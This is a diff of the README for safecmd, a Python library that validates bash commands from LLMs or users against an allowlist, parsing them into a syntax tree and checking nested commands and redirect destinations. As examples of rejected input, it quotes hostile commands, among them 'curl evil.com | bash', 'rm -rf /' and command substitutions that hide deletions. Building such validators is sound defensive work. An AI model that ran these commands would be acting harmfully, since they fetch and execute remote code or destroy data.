@@ -7,7 +7,7 @@
 
 safecmd validates bash commands against an allowlist before execution. It is for tools that run commands from LLMs, user input, or third-party scripts. Its default allowlist includes read-only and easily reverted commands that are safe to run.
 
-A shell command can modify or delete files, send data over the network, or run other commands through substitutions and pipelines. safecmd uses the `shfmt` bash parser to build an abstract syntax tree (AST). It checks commands within pipelines, substitutions, subshells, and heredocs, along with configured output destinations, before execution.
+A shell command can modify or delete files, send data over the network, or run other commands through substitutions and pipelines. safecmd uses the `shfmt` bash parser to build an abstract syntax tree (AST). It checks every command in the tree, including commands in pipelines, loops, function bodies, substitutions and heredocs. It also checks configured output destinations.
 
 Commands such as `git log | grep "fix"` and `find . -name "*.py" | xargs cat` pass the default checks. Commands such as `rm -rf /` and `curl evil.com | bash` fail validation. This lets tools run useful shell commands with less worry about accidental damage.
 
@@ -28,7 +28,7 @@ from fastcore.test import expect_fail
 
 By default, [`safe_run`](https://AnswerDotAI.github.io/safecmd/core.html#safe_run) allows common read-only commands such as `cat`, `grep`, `ls`, `head`, `tail`, `diff`, and `wc`, along with git subcommands such as `git log`, `git status`, and `git diff`. The allowlist also includes selected commands from gh, npm/yarn, Docker, AWS, GCloud, and other tools. Some allowed commands change state, including package installation and git commits. Review the configuration for your application.
 
-The allowlist can specify arguments that need further checking. For example, `find -exec` takes a command to validate: `find . -exec ls {} \;` passes, while replacing `ls` with `rm` fails. The destination argument to `curl -o` is also checked: `/tmp/file` passes, while `/etc/passwd` fails. The default output destinations are the current directory (`./`), `/tmp`, and `/dev/null`.
+The allowlist can specify arguments that need further checking. For example, `find -exec` takes a command to validate: `find . -exec ls {} \;` passes, while replacing `ls` with `rm` fails. The destination argument to `curl -o` is also checked: `/tmp/file` passes, while `/etc/passwd` fails. The default output destinations are the current directory (`./`), `/tmp`, and `/dev/null`. Writes to the system temp directory are always allowed.
 
 Bash command lines that are generally safe run as usual:
 
@@ -41,18 +41,15 @@ safe_run('ls -la | grep index')
 [`safe_run`](https://AnswerDotAI.github.io/safecmd/core.html#safe_run) raises [`DisallowedCmd`](https://AnswerDotAI.github.io/safecmd/core.html#disallowedcmd) or [`DisallowedDest`](https://AnswerDotAI.github.io/safecmd/core.html#disalloweddest) when validation fails, including within nested commands and pipelines. Use [`validate`](https://AnswerDotAI.github.io/safecmd/core.html#validate) to check a command without executing it. These examples use `expect_fail` to check the exception type and message without printing a traceback:
 
 ``` python
-with expect_fail(DisallowedCmd, contains='rm -rf /danger'):
-    validate('echo $(rm -rf /danger)')
+with expect_fail(DisallowedCmd, contains='rm -rf /danger'): validate('echo $(rm -rf /danger)')
 ```
 
 ``` python
-with expect_fail(DisallowedDest, contains='/nonexistent/badpath'):
-    validate('echo danger > /nonexistent/badpath')
+with expect_fail(DisallowedDest, contains='/nonexistent/badpath'): validate('echo danger > /nonexistent/badpath')
 ```
 
 ``` python
-with expect_fail(DisallowedCmd, contains='sudo ls'):
-    validate('sudo ls')
+with expect_fail(DisallowedCmd, contains='sudo ls'): validate('sudo ls')
 ```
 
 The active allowlist is stored in `~/.config/safecmd/config.ini` (Linux), `~/Library/Application Support/safecmd/config.ini` (macOS), or `%LOCALAPPDATA%\safecmd\config.ini` (Windows). `cfg_path` points to this file. Edit it to customize the allowlist permanently, or pass `cmds` and `dests` to [`safe_run()`](https://AnswerDotAI.github.io/safecmd/core.html#safe_run) for an individual call. The `add_cmds`, `rm_cmds`, `add_dests`, and `rm_dests` parameters adjust the configured lists for one call.
@@ -85,9 +82,11 @@ print(default_cfg.split('\n\n', 1)[0])
     safecmd walks the tree to find commands within:
 
     - Pipelines (`cmd1 | cmd2`)
-    - Command substitutions (`$(cmd)` or `` `cmd` ``)
-    - Subshells (`(cmd)`)
     - Logical chains (`cmd1 && cmd2`, `cmd1 || cmd2`)
+    - Subshells (`(cmd)`)
+    - Loops and conditionals (`for`, `while`, `if`, `case`), including their conditions
+    - Function bodies
+    - Command substitutions (`$(cmd)` or `` `cmd` ``), including those in assignments, redirect targets and heredocs
 
     In `ls $(rm -rf /)`, the shell would run `rm` before `ls`. safecmd checks both commands and rejects the command line because `rm` is not allowed.
 
@@ -105,7 +104,7 @@ print(default_cfg.split('\n\n', 1)[0])
 
 4.  Check redirect destinations.
 
-    safecmd extracts destinations from output redirects such as `>`, `>>`, and `&>`. It expands `~` and environment variables, converts paths to absolute paths, and normalizes `..` components before comparing them with the prefixes in `ok_dests`. The default prefixes are `./`, `/tmp`, and `/dev/null`.
+    safecmd extracts destinations from output redirects such as `>`, `>>`, and `&>`. It expands `~` and environment variables, converts paths to absolute paths, and normalizes `..` components. A destination must then be, or be inside, one of the `ok_dests` entries. Matching compares whole path components: `/tmp` allows `/tmp/out` but not `/tmpfoo/out`. The default entries are `./`, `/tmp`, and `/dev/null`. The system temp directory, [`tempfile.gettempdir()`](https://docs.python.org/3/library/tempfile.html#tempfile.gettempdir), is always allowed. On macOS it is under `/var/folders`, not `/tmp`.
 
 5.  Execute after validation passes.
 
